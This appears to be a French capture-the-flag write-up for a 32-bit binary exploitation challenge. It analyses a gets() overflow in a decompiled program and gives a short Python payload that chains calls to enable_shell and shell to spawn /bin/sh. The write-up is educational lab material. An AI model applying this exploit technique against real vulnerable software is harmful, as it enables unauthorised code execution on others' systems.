## PWN / 0x00b

<p align="center">
  <img src="img/consignes.png" />
</p>

### Fichiers

- binaire : [0xb0f](0xb0f)
- libc : [libc-2.27.so](libc-2.27.so)

### Challenge

Une fois n'est pas de coutume, nous avons un binaire 32 bits, ça faisait longtemps, à garder en tête pour la suite, cela change les conventions d'appel ...

```bash
$ file 0xb0f
0xb0f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d504007e94e68eea1de94d0c4f96c05e57cfb843, not stripped
```

```bash
$ checksec --file=0xb0f
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```


On décompile le code, pour regarder un peu ses fonctionnalités :

#### main()

```c
undefined4 main(void)

{
  uint seed;
  int alea;
  undefined *msg_result [5];
  undefined *local_14;

  local_14 = &stack0x00000004;
  seed = time((time_t *)0x0);
  srand(seed);
  msg_result[0] = &DAT_080488a3; // "lost"
  msg_result[1] = &DAT_080488a8; // "won"
  alea = rand();
  seed = get_int_input();
  printf("[+] You %s\n",msg_result[(alea - (alea >> 0x1f) & 1U) + (alea >> 0x1f) == (seed & 1)]);
  return 0;
}
```

Le programme demande une saisie (un entier) et après un peu de magie dessus décide si l'on gagne ou perd.

Jusque là, rien de fou.

#### get_int_input()

```c
void get_int_input(void)

{
  char user_input [14];

  printf("Give me a number: ");
  fflush(stdout);
  gets(user_input);
  atol(user_input);
  return;
}
```

La fonction appelée pour récupérer la saisie est plus intéressante, puisqu'elle prépare un buffer de 14 octets, mais ne vérifie pas la taille de l'input : `gets()`

Il va donc être possible d'overflow le buffer, et d'écraser la sauvegarde de l'adresse de retoure de `get_int_input()` sur la stack.

La stack est non executable, donc on ne va pas passer par un shellcode ... en revanche on remarque deux autres fonctions qui ne sont pas appelée par le flow d'exécution normal.


#### shell()

```c
void shell(int param_1)

{
  if (param_1 == -0x21524111) {
    if (shell_enabled == '\x01') {
      puts("[+] Launching shell...");
      execve("/bin/sh",(char **)0x0,(char **)0x0);
    }
    else {
      puts("[-] Shell not enabled yet");
    }
  }
  else {
    puts("[-] Wrong value !");
  }
  return;
}
```

Top, on a une fonction qui donne directement un shell dans le programme.

Il faut l'appeler avec `-0x21524111 = 0xdeadbeef` en argument et que au préalable `shell_enabled` (variable globale) soit à `true`.

#### enable_shell()

```c
void enable_shell(int param_1)

{
  if (param_1 == -0x35013f22) {
    shell_enabled = 1;
    puts("[+] Shell enabled");
  }
  else {
    shell_enabled = 0;
    puts("[-] Shell disabled");
  }
  return;
}
```

Elle doit être appelée avec `-0x35013f22 = 0xcafec0de` pour activer `shell_enabled`.

### Solution

Finalement il faut :
- écraser le saved rip de `get_int_input`
- appeler `enable_shell` avec le bon argument
- appeler `shell` avec le bon argument

En 32 bit, les arguments sont passés sur la stack :

```
Adresse de la fonction
Adresse de retour de la fonction
Argument 1
Argument 2
...
```

Il faut donc faire ici attention à l'adresse de retour ... sinon on va appeler `enable_shell()` mais le retour ira n'importe où et la suite ne s'exécutera pas.

En passant l'adresse de `get_int_input()` comme adresse de retour de `enable_shell()`, le programme nous redemandera une saisie et nous pourrons envoyer la deuxième partie du payload :

```python
enable_shell = 0x080485c6
shell = 0x0804861e
get_int_input = 0x0804869a

payload = b"A" * 22
payload += p32(enable_shell)
payload += p32(get_int_input)
payload += p32(0xcafec0de)

payload2 = b"B" * 22
payload2 += p32(shell)
payload2 += p32(0xdeadbeef)
payload2 += p32(0xdeadbeef)
```

Les 22 octets en début de payload sont le padding pour écraser le saved RIP, on peut les calculer statiquement ou regarder dans GDB la disposition de la stack quand on saisit une entrée.

code : [0xb0f.py](0xb0f.py)
